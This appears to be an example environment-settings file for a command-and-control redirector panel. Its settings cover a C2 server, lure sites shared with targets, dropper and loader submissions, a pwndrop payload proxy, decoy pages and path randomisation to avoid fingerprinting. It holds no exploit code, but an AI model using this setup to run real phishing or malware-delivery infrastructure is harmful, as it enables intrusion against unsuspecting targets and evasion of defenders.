# Development defaults work with SQLite. Set these for production.
DEBUG=false
DJANGO_SECRET_KEY=replace-with-a-long-random-secret
ANALYTICS_IP_HASH_SALT=replace-with-a-different-long-random-secret
# The panel is served on the standard ports through the web tier (80/http,
# 443/https with an auto-generated self-signed certificate).
# By default the panel accepts ANY host/IP (ALLOWED_HOSTS=*). Normal
# same-origin form posts pass CSRF checks without any trusted origins, so
# CSRF_TRUSTED_ORIGINS stays empty; add entries here only if something
# legitimately posts to the panel cross-origin. Enable host whitelisting by
# listing your hostnames/IPs, e.g. ALLOWED_HOSTS=panel.example.com,203.0.113.10
ALLOWED_HOSTS=*
CSRF_TRUSTED_ORIGINS=
BOOTSTRAP_BASE_URL=http://localhost
# No operator IP allowlist anywhere by default. To whitelist client
# addresses, see the commented allow/deny rules in docker/panel-web.conf or
# bind the published ports to a specific interface in docker-compose.yml.
# Session/CSRF cookies are not marked Secure by default so plain-http
# browsing from any IP works out of the box; set both to true when you
# serve the panel over proper https:
# SESSION_COOKIE_SECURE=true
# CSRF_COOKIE_SECURE=true
BOOTSTRAP_TOKEN_TTL_MINUTES=0
INVITATION_TTL_HOURS=48
ANALYTICS_RETENTION_DAYS=30
ANALYTICS_ALERT_THRESHOLD=1000
# Track all requests in the events stream, not just 404s (2xx/3xx/5xx included).
# Applies to the web tier and collector; recreate both after changing.
TRACK_ALL_REQUESTS=0
NGINX_JSON_LOG_PATH=/var/log/nginx/access.json
PORT=3000

# Production PostgreSQL (used by docker-compose.yml)
POSTGRES_DB=redirector_panel
POSTGRES_USER=redirector
POSTGRES_PASSWORD=replace-with-a-database-password
DATABASE_URL=postgres://redirector:replace-with-a-database-password@db:5432/redirector_panel

# Optional background processes and Telegram delivery
RUN_COLLECTOR=false
RUN_NOTIFICATION_WORKER=false
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# Existing redirector edge service (only with --profile edge)
DOMAIN_NAME=
C2_SERVER=
C2_SCHEME=http
UA_PATTERN=
# Control plane address the edge proxies /g/ gate traffic to (host:port)
PANEL_UPSTREAM=panel:3000

# Release gates. start.sh randomizes these per deployment so the public
# surface carries no shared fingerprint; keep them stable once set (existing
# links keep the base they were created with).
GATE_BASE_PATH=/g/
AGENT_BASE_PATH=/a/
# Hosted lure sites are mounted here: <LURE_BASE_PATH><slug>/<file>. Kept
# stable (not randomized) because lure URLs are shared with targets; set a
# custom prefix if /l/ feels too guessable. Must differ from the bases above.
LURE_BASE_PATH=/l/
# Secret URL prefix for all operator paths (/panel, /api, /m, /login, /setup,
# django-admin): generated by start.sh, e.g. 74a64cbe-0c1d-496b-91c4-fd9a22eb1d20.
# Unknown paths (including the unprefixed /panel/...) show the decoy to
# anonymous visitors. Empty = unprefixed, only for local development.
OPERATOR_PREFIX=replace-with-random-prefix
# Auto-ban an IP after this many suspicious events within one hour (0 = off)
AUTO_BAN_THRESHOLD=5
# Optional nginx include files managed by the panel (empty = sync disabled)
NGINX_BAN_INCLUDE=
NGINX_AGENT_ROUTES_INCLUDE=
# pwndrop proxy safeguards
PWNDROP_TIMEOUT=10
PWNDROP_MAX_BYTES=536870912
# Undo window for approve/deny decisions (seconds)
DECISION_UNDO_SECONDS=10
# Embed per-visitor canary pixels in decoy pages (default on)
DECOY_CANARIES=true
# Domains this redirector serves; enables per-link domain pinning
REDIRECTOR_DOMAINS=
# Peers whose X-Forwarded-For header is trusted (nginx edge on the same host)
TRUSTED_PROXIES=127.0.0.1,::1
# Maximum accepted submission body from droppers/loaders
SUBMISSION_MAX_BYTES=4194304
# Web Push (VAPID) - generate with: python manage.py vapid_keys
VAPID_PRIVATE_KEY=
VAPID_PUBLIC_KEY=
VAPID_ADMIN_EMAIL=mailto:operators@example.com
# Set true to skip the startup self-test gate (not recommended)
SELFTEST_SKIP=false
# Strict-Transport-Security on the TLS listener (e.g. 31536000); empty = off.
# Its absence is a soft custom-stack tell; enable once https is the real path.
HSTS_MAX_AGE=
# Panel's public FQDN. When set, the web tier requests a real Let's Encrypt
# certificate on first start (nginx answers the ACME challenge on port 80) and
# renews it in the background; the store persists in docker/letsencrypt across
# resets. Leave empty for the self-signed fallback.
PANEL_DOMAIN=
# Optional registration email for Let's Encrypt expiry notices.
LETSENCRYPT_EMAIL=
# Fail the web tier instead of falling back to self-signed when a real
# certificate request fails.
TLS_REQUIRE_REAL=0
